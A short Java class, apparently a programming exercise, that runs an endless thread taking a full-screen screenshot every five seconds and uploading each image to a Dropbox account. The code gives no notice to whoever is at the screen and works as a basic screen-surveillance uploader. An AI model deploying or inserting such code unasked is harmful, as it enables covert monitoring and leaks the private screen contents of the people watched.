package task2;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
   private int i;
   private DbxClientV2 client;
   MyThread(DbxClientV2 client) {
      this.client = client;
   }
    public void run() {
        while (true) {
           try {
              BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

              ByteArrayOutputStream os = new ByteArrayOutputStream();
              ImageIO.write(image,"png", os);
              InputStream fis = new ByteArrayInputStream(os.toByteArray());

              client.files().uploadBuilder("/scrin"+new Date() +".png").uploadAndFinish(fis);
              sleep(5000);
                } catch (Exception e) {
               e.printStackTrace();
               break;
              }
        }
    }
}
